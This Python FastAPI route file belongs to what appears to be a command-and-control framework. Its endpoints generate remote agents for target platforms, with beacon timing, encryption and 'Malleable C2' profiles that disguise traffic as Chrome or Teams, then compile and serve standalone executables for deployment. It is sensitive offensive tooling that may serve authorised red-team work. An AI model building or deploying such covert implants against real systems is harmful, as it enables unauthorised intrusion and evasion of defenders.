"""
Agent Generator API Routes

Endpoints for generating agents with Malleable C2 profile support.
"""

from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from typing import List, Optional
import os

from app.services.agent_builder import AgentBuilder
from app.services.agent_generator import AgentGenerator
from app.services.agent_factory import AgentFactory
from app.services.communication.profiles import AVAILABLE_PROFILES
from app.api.deps import get_current_operator
from app.models.database.operator import Operator

router = APIRouter()


class AgentGenerateRequest(BaseModel):
    """Request schema for agent generation"""
    platform: str
    c2_server: str
    features: List[str] = []
    sleep_interval: int = 60
    jitter: float = 0.0
    encryption_enabled: bool = False
    custom_name: Optional[str] = None
    profile: str = "chrome_browser"  # ← ADDED: Malleable C2 profile


@router.get("/platforms")
async def get_platforms(
    current_user: Operator = Depends(get_current_operator)
):
    """
    Get supported platforms.
    
    GET /api/v1/generator/platforms
    """
    return {
        "platforms": AgentFactory.get_supported_platforms()
    }


@router.get("/features/{platform}")
async def get_features(
    platform: str,
    current_user: Operator = Depends(get_current_operator)
):
    """
    Get available features for a platform.
    
    GET /api/v1/generator/features/windows
    """
    try:
        features = AgentFactory.get_features_for_platform(platform)
        return {
            "platform": platform,
            "features": features
        }
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


@router.get("/profiles")
async def get_profiles(
    current_user: Operator = Depends(get_current_operator)
):
    """
    Get available Malleable C2 profiles.
    
    GET /api/v1/generator/profiles
    
    Response:
    {
        "profiles": [
            {
                "name": "chrome_browser",
                "description": "Mimics Google Chrome browser traffic"
            },
            ...
        ]
    }
    """
    profiles = []
    for profile_name, profile in AVAILABLE_PROFILES.items():
        profiles.append({
            "name": profile.name,
            "description": profile.description
        })
    
    return {"profiles": profiles}


@router.post("/generate")
async def generate_agent(
    request: AgentGenerateRequest,
    current_user: Operator = Depends(get_current_operator)
):
    """
    Generate a new agent with Malleable C2 profile.
    
    POST /api/v1/generator/generate
    {
        "platform": "windows",
        "c2_server": "http://192.168.1.100:8000/api/v1/agents",
        "features": ["screenshot"],
        "sleep_interval": 60,
        "jitter": 0.2,
        "encryption_enabled": false,
        "custom_name": "mytestagent",
        "profile": "microsoft_teams"  // ← NEW
    }
    """
    
    try:
        # Validate profile
        if request.profile not in AVAILABLE_PROFILES:
            raise ValueError(f"Invalid profile: {request.profile}. Available: {', '.join(AVAILABLE_PROFILES.keys())}")
        
        # Build configuration
        builder = AgentBuilder()
        
        config = (builder
            .set_platform(request.platform)
            .set_c2_server(request.c2_server)
            .add_features(request.features)
            .set_beacon(request.sleep_interval, request.jitter)
            .set_profile(request.profile)  # ← ADDED: Set profile
        )
        
        # Set custom name if provided
        if request.custom_name and request.custom_name.strip():
            print(f"🏷️  Using custom name: {request.custom_name}")
            config = config.set_custom_name(request.custom_name.strip())
        else:
            print(f"🏷️  Using auto-generated name")
        
        # Enable encryption if requested
        if request.encryption_enabled:
            config = config.enable_encryption()
        
        # Build final configuration
        config = config.build()
        
        # Generate agent and executable
        generator = AgentGenerator()
        result = generator.generate(config, build_executable=True)
        
        # Get filenames
        python_filename = os.path.basename(result["python_file"])
        
        response_data = {
            "success": True,
            "agent_id": config["agent_id"],
            "python_file": python_filename,
            "download_python": f"/api/v1/generator/download/{python_filename}",
            "config": {
                "platform": config["platform"],
                "features": config["features"],
                "sleep_interval": config["sleep_interval"],
                "jitter": config["jitter"],
                "encryption_enabled": config["encryption_enabled"],
                "profile": config["profile"]  # ← ADDED: Include profile in response
            }
        }
        
        # Add executable info if available
        if result["executable_file"]:
            exe_filename = os.path.basename(result["executable_file"])
            response_data.update({
                "executable": exe_filename,
                "download_executable": f"/api/v1/generator/download/{exe_filename}",
                "ready_to_deploy": True,
                "deployment_note": "Executable includes all dependencies and can run on target without Python installed"
            })
        else:
            response_data.update({
                "executable": None,
                "ready_to_deploy": False,
                "deployment_note": "Executable build failed. Use Python file or rebuild manually."
            })
        
        print(f"✅ Agent generated by {current_user.username}: {python_filename} (Profile: {request.profile})")
        
        return response_data
    
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Generation failed: {str(e)}")


@router.get("/download/{filename}")
async def download_agent(
    filename: str,
    current_user: Operator = Depends(get_current_operator)
):
    """
    Download generated agent (Python source or executable).
    """
    from pathlib import Path
    
    # Get absolute paths
    current_file = Path(__file__).resolve()
    backend_dir = current_file.parent.parent.parent.parent
    
    # Check if it's an executable
    if filename.endswith('.exe') or (not filename.endswith('.py') and not '.' in filename):
        # Executable file
        output_dir = backend_dir / "generated_agents" / "executables"
        filepath = output_dir / filename
    else:
        # Python source file
        output_dir = backend_dir / "generated_agents"
        filepath = output_dir / filename
    
    if not filepath.exists():
        raise HTTPException(status_code=404, detail=f"File not found: {filename}")
    
    # Security: Only allow downloading .py and .exe files
    if not (filename.endswith('.py') or filename.endswith('.exe') or (not '.' in filename)):
        raise HTTPException(status_code=400, detail="Invalid file type")
    
    print(f"📥 Agent downloaded by {current_user.username}: {filename}")
    
    # Determine media type
    if filename.endswith('.exe') or not '.' in filename:
        media_type = 'application/x-msdownload'
    else:
        media_type = 'text/x-python'
    
    return FileResponse(
        str(filepath),
        media_type=media_type,
        filename=filename
    )